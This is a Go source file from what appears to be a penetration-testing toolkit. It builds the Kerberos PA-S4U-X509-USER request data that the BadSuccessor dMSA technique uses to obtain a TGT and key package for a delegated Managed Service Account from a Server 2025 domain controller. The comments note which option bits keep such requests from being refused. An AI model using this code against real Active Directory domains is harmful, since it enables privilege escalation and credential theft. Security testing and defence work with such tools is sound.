package dmsa

import (
	"encoding/asn1"
	"encoding/binary"
	"fmt"

	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/crypto"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/iana/nametype"
	"github.com/mandiant/gopacket/pkg/third_party/gokrb5/types"
)

// PA-S4U-X509-USER pre-auth data type (MS-SFU 2.2.2).
const PADataTypeS4UX509User = 130

// Key usage for the PA-S4U-X509-USER checksum (MS-SFU 2.2.2;
// KRB_KEY_USAGE_PA_S4U_X509_USER in Rubeus).
const keyUsageS4UX509User = 26

// PA_S4U_X509_USER_OPTIONS bits (MS-SFU 2.2.2). BadSuccessor requests
// need UNCONDITIONAL_DELEGATION on top of the standard SIGN_REPLY —
// Rubeus' dMSA support (GhostPack PR #194) found requests without it are
// refused, and that the S4UUserID cname must be NT_PRINCIPAL, not the
// NT_ENTERPRISE form classic S4U2Self uses.
const (
	s4uOptionUnconditionalDelegation = 0x08000000
	s4uOptionSignReply               = 0x20000000
)

// BuildS4UX509User builds the PA-S4U-X509-USER padata-value that asks a
// Server 2025 KDC to issue a TGT for dmsaName including the
// KERB-DMSA-KEY-PACKAGE. nonce must match the enclosing KDC-REQ-BODY
// nonce; sessionKey is the caller's TGT session key (the checksum is
// keyed with it, usage 26).
//
//	S4UUserID ::= SEQUENCE {
//	    nonce  [0] UInt32,
//	    cname  [1] PrincipalName,      -- NT_PRINCIPAL for dMSA
//	    crealm [2] Realm,
//	    options[4] BIT STRING          -- SIGN_REPLY | UNCONDITIONAL_DELEGATION
//	}
//	PA-S4U-X509-USER ::= SEQUENCE {
//	    user-id  [0] S4UUserID,
//	    checksum [1] Checksum
//	}
func BuildS4UX509User(dmsaName, realm string, nonce int, sessionKey types.EncryptionKey) (types.PAData, error) {
	// S4UUserID
	var opts [4]byte
	binary.BigEndian.PutUint32(opts[:], s4uOptionSignReply|s4uOptionUnconditionalDelegation)
	userID := derSeq(
		derExplicit(0, derInt(int64(nonce))),
		derExplicit(1, marshalPrincipalName(nametype.KRB_NT_PRINCIPAL, []string{dmsaName})),
		derExplicit(2, derGeneralString(realm)),
		derExplicit(4, derBitString(opts[:])),
	)

	// checksum over the DER of S4UUserID, keyed with the TGT session key
	// (same crypto call gopacket's pkg/kerberos uses for PA-FOR-USER).
	// MS-SFU 2.2.2: the checksum is the required checksum of the session
	// key's etype — HMAC-SHA1-96 for AES, and KERB_CHECKSUM_HMAC_MD5
	// (-138, RFC 4757) for RC4 — at key usage 26. Rubeus and impacket
	// hardcode the AES256 profile even for RC4 session keys; we follow
	// MS-SFU per etype. Interop note: with an AES256 session key our
	// PA-S4U-X509-USER is byte-identical to impacket's merged -dmsa
	// implementation (fortra/impacket PR #2010) — both were refused by
	// the Server 2022 lab KDC with the identical KRB_AP_ERR_BADMATCH,
	// which is the 2022 denial for this 2025-only path.
	et, err := crypto.GetEtype(sessionKey.KeyType)
	if err != nil {
		return types.PAData{}, fmt.Errorf("s4u-x509-user: unsupported session key etype %d: %v", sessionKey.KeyType, err)
	}
	sum, err := et.GetChecksumHash(sessionKey.KeyValue, userID, keyUsageS4UX509User)
	if err != nil {
		return types.PAData{}, fmt.Errorf("s4u-x509-user checksum: %v", err)
	}
	cksum := derSeq(
		derExplicit(0, derInt(int64(et.GetHashID()))),
		derExplicit(1, derOctetString(sum)),
	)

	pa := derSeq(
		derExplicit(0, userID),
		derExplicit(1, cksum),
	)
	return types.PAData{PADataType: PADataTypeS4UX509User, PADataValue: pa}, nil
}

// marshalPrincipalName encodes a PrincipalName SEQUENCE:
//
//	PrincipalName ::= SEQUENCE {
//	    name-type   [0] Int32,
//	    name-string [1] SEQUENCE OF KerberosString
//	}
func marshalPrincipalName(nameType int32, parts []string) []byte {
	inner := derExplicit(0, derInt(int64(nameType)))
	var strs []byte
	for _, p := range parts {
		strs = append(strs, derGeneralString(p)...)
	}
	inner = append(inner, derExplicit(1, derSeq(strs))...)
	return derSeq(inner)
}

// parseS4UX509UserUserID unwraps a marshaled PA-S4U-X509-USER for tests:
// it returns the DER of the inner S4UUserID so the checksum input can be
// reconstructed and verified.
func parseS4UX509UserUserID(der []byte) (userID []byte, err error) {
	var seq asn1.RawValue
	if _, err := asn1.Unmarshal(der, &seq); err != nil {
		return nil, err
	}
	for body := seq.Bytes; len(body) > 0; {
		var field asn1.RawValue
		body, err = asn1.Unmarshal(body, &field)
		if err != nil {
			return nil, err
		}
		if field.Class == asn1.ClassContextSpecific && field.Tag == 0 {
			return field.Bytes, nil
		}
	}
	return nil, fmt.Errorf("no user-id field")
}
